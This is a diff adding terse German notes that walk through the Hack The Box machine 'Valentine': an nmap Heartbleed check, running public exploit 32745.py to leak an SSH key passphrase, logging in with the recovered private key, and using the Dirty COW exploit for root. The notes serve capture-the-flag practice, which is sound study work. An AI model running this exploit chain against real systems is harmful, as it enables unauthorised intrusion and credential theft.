@@ -1,0 +1,31 @@
+Valentine 
+==================
+Kurzbeschreibung
+------------------
+- Heartbleed liefert Passwort für Private Key in Verzeichnis /dev
+- Dirty Cow Exploit
+------------------
+
+- 22,80,443
+- nikto
+- /dev
+   => notes.txt
+      "Fix decoder/encoder...make sure encoding/decoding is only done
+       client-side"
+   => hype_key
+      => hex to ascii
+      => ist RSA private key
+- /encode
+- /decode
+- Titelbild mit Herz
+   => heartbleed?
+   => nmap -p 443 --script ssl-heartbleed 10.10.10.79
+      => VULN!
+- searchsploit -m  exploits/multiple/remote/32745.py
+- python 32745.py 10.10.10.79 > out
+   => $text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== 
+   => "heartbleedbelievethehype"
+- ssh hype@10.10.10.79 -i hype_key (pwd=heartbleedbelievethehype)
+  => cat user.txt
+- searchsploit -m exploits/linux/local/40839.c (dirty cow) 
+  => cat root.txt
